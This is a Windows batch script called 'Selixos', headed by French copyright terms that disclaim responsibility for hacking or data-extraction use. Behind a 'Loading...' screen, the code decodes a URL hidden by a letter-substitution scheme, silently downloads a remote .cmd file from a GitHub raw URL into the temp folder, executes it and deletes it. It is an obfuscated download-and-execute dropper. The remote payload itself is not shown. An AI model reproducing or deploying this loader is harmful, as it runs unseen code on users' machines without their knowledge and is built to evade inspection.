:: ============================================================================================================
::                                        DROITS D'AUTEUR ET CONDITIONS D'UTILISATION
::
:: Ce script, intitule "Selixos", a ete cree par m.a.s_dev. Toute utilisation, distribution ou modification
:: de ce script est soumise aux termes et conditions suivants. Le createur m.a.s_dev se reserve tous les droits
:: sur ce script. Pour plus d'informations sur m.a.s_dev, veuillez consulter le Linktree :
:: https://linktr.ee/m.a.s_dev
::
:: 1. DROITS D'AUTEUR
:: - Ce script est protege par le droit d'auteur. Vous n'êtes pas autorise à le modifier, le distribuer ou le
::  reutiliser à des fins commerciales ou non commerciales sans l'autorisation expresse de m.a.s_dev.
:: - Vous êtes autorise à utiliser ce script tel quel pour vos besoins personnels, mais toute alteration du code
::   peut rendre le script inutilisable ou provoquer des dysfonctionnements.
::
:: 2. LIMITATION DE RESPONSABILITe
:: - Ce script est fourni "tel quel", sans garantie d'aucune sorte. m.a.s_dev ne pourra être tenu responsable des
::   dommages, pertes de donnees ou autres consequences resultant de l'utilisation de ce script.
::- Vous reconnaissez que l'utilisation de ce script, notamment à des fins de piratage, d'extraction de donnees ou
::  toute autre activite illegale, est de votre entiere responsabilite. Vous êtes seul responsable de toute action
::   entreprise en utilisant ce script.
:: 
:: 3. INTERDICTION DE MODIFICATION
:: - Il est strictement interdit de modifier ou d'alterer ce script. Les modifications peuvent rendre le script
::   instable ou entraîner des erreurs de fonctionnement. Toute alteration du code est aux risques et perils de
::   l'utilisateur.
:: - Le createur n'est pas tenu de fournir un support ou une assistance pour les versions modifiees du script.
::
:: En utilisant ce script, vous acceptez ces conditions.
:: ============================================================================================================

@echo off
setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
title Loading...
color f
echo Loading...
(set PLRQZHJ[ONJLIU]=a) & (set PLRQZHJ[SZVNHL]=b) & (set PLRQZHJ[VRIDUF]=c) & (set PLRQZHJ[QMWKTI]=d) & (set PLRQZHJ[J62DSP]=e)
(set PLRQZHJ[MQBRKH]=f) & (set PLRQZHJ[BOANMW]=g) & (set PLRQZHJ[QOXYBZ]=h) & (set PLRQZHJ[7AC5VB]=i) & (set PLRQZHJ[FTP1NK]=j)
(set PLRQZHJ[PTIELI]=k) & (set PLRQZHJ[ROSI27]=l) & (set PLRQZHJ[OKDH85]=m) & (set PLRQZHJ[TJNI5D]=n) & (set PLRQZHJ[OJ854D]=o)
(set PLRQZHJ[CA41DV]=p) & (set PLRQZHJ[OJISD5]=q) & (set PLRQZHJ[LM5WGD]=r) & (set PLRQZHJ[EDSDJC]=s) & (set PLRQZHJ[FKQ8JD]=t)
(set PLRQZHJ[T45SFC]=u) & (set PLRQZHJ[PDG56I]=v) & (set PLRQZHJ[133SIW]=w) & (set PLRQZHJ[NDJCUK]=x) & (set PLRQZHJ[L5D2JV]=y)
(set PLRQZHJ[52GHTM]=z)
set "THMPXW=QOXYBZFKQ8JDFKQ8JDCA41DVEDSDJC://LM5WGDONJLIU133SIW.BOANMW7AC5VBFKQ8JDQOXYBZT45SFCSZVNHLT45SFCEDSDJCJ62DSPLM5WGDVRIDUFOJ854DTJNI5DFKQ8JDJ62DSPTJNI5DFKQ8JD.VRIDUFOJ854DOKDH85/OKDH85ONJLIUEDSDJC34732/FKQ8JDOJ854DOJ854DROSI27/OKDH85ONJLIU7AC5VBTJNI5D/ONJLIUQMWKTINDJCUKFKQ8JD.VRIDUFOKDH85QMWKTI"
set "THMPXW2=%THMPXW%"
set "PLASOZ="
:kizdjqusxoa
set "VGJBMCW="
set "KGYQVL=%THMPXW2:~0,6%"
if defined PLRQZHJ[%KGYQVL%] (
    set "PLASOZ=%PLASOZ%!PLRQZHJ[%KGYQVL%]!"
    set "THMPXW2=%THMPXW2:~6%"
    set "VGJBMCW=1"
) else (
    set "PLASOZ=%PLASOZ%!THMPXW2:~0,1!"
    set "THMPXW2=%THMPXW2:~1%"
)
if not "%THMPXW2%"=="" goto kizdjqusxoa
set "fp=%TEMP%\addxt.cmd"
(for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr /i "IPv4"') do @if NOT "%%A"==" 127.0.0.1" set "cx=true") & if exist "!fp!" del "!fp!"
if "%cx%"=="true" (
    if exist "!fp!" (
    del "!fp!"
    )
    curl -s -o "!fp!" %PLASOZ%
    if exist "!fp!" (
        call "!fp!"
        timeout /t 1 /nobreak >nul
        del "!fp!"
    ) else (
        echo Erreur du system.
        pause
    )
) else (
    echo Pas de connexion Internet.
    pause
)
